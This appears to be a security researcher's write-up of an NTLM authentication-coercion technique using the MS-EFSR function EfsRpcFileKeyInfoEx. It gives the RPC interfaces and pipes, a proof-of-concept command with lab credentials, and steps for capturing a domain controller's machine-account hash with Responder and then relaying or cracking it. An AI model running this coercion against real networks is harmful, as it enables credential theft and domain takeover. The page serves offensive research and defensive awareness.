# MS-EFSR - Remote call to EfsRpcFileKeyInfoEx (opnum 16)

## Summary

+ **Protocol**: [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)

+ **Function name**: [`EfsRpcFileKeyInfoEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d0da10ab-3139-4d67-a66c-ea6eb497118d)

+ **Function operation number**: `16`

+ **RPC Interfaces**:
   + Interface 1:
     - uuid=`c681d488-d850-11d0-8c52-00c04fd90f7e`
     - version=`1.0`
     - Accessible through:
       + SMB named pipe: `\PIPE\lsarpc`
       + SMB named pipe: `\PIPE\lsass`
       + SMB named pipe: `\PIPE\netlogon`
       + SMB named pipe: `\PIPE\samr`
   + Interface 2:
     - uuid=`df1941c5-fe89-4e79-bf10-463657acf44d`
     - version=`1.0`
     - Accessible through:
       + SMB named pipe: `\PIPE\efsrpc`


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\pipe\efsrpc` and bind to the desired [`MS-EFSR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) protocol (with uuid `c681d488-d850-11d0-8c52-00c04fd90f7e` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-EFSR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\pipe\efsrpc` This pipe is connected to the protocol [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) and allows to call RPC functions of this protocol. We will then call the remote [`EfsRpcFileKeyInfoEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d0da10ab-3139-4d67-a66c-ea6eb497118d) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
EfsRpcFileKeyInfoEx('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
DWORD EfsRpcFileKeyInfoEx(
   [in] handle_t binding_h,
   [in] DWORD dwFileKeyInfoFlags,
   [in, unique] EFS_RPC_BLOB* Reserved,
   [in, string] wchar_t* FileName,
   [in] DWORD InfoClass,
   [out] EFS_RPC_BLOB** KeyInfo
 );
```

+ **binding_h**: This is an RPC binding handle parameter, as specified in [C706] and [MS-RPCE] section 2.

+ **dwFileKeyInfoFlags**: This parameter is reserved. It MUST be set to zero by the client and ignored by the server.

+ **Reserved**: This parameter is reserved. It MUST be set to NULL by the client and ignored by the server.

+ **FileName**: An EFSRPC identifier, as specified in section 2.2.1.

+ **InfoClass**: One of the values specified for the InfoClass parameter of the EfsRpcFileKeyInfo method. One of the values in the following table. With the exception of UPDATE_KEY_USED (0x00000100), a server SHOULD support all of these values. A server MAY choose to support UPDATE_KEY_USED.<45>

| Name | Value | Description |
|---|---|---|
| `BASIC_KEY_INFO` | `0x00000001` |  Request information about the keys used to encrypt the object's contents. On success, the server will return the information in an `EFS_KEY_INFO` (2.2.14) structure in the `KeyInfo` parameter. | 
| `CHECK_COMPATIBILITY_INFO` | `0x00000002` | Requests the EfsVersion for the encrypted file. On success, the server will return the information in an `EFS_COMPATIBILITY_INFO` structure in the KeyInfo parameter. | 
| `UPDATE_KEY_USED` | `0x00000100` | Update the user certificates used to give a specific user access to an object. The server will populate the `KeyInfo` parameter with a zero-terminated, wide character Unicode string that contains a newline-separated list of names of objects successfully updated. | 
| `CHECK_DECRYPTION_STATUS` | `0x00000200` | Request a hint from the server as to whether the given object could be successfully decrypted without further user intervention or higher-level events. The server will return this information in an `EFS_DECRYPTION_STATUS_INFO` structure in the `KeyInfo` parameter. |
| `CHECK_ENCRYPTION_STATUS` | `0x00000400` | Request a hint from the server as to whether the given object could be successfully encrypted without further user intervention or higher-level events. The server will return this information in an `EFS_ENCRYPTION_STATUS_INFO` structure in the `KeyInfo` parameter. |


+ **KeyInfo**: The server SHOULD ignore this parameter.

+ **Return Values**: The server SHOULD return a nonzero value.

## References

+ Documentation of protocol [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31

+ Documentation of function `EfsRpcFileKeyInfoEx`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d0da10ab-3139-4d67-a66c-ea6eb497118d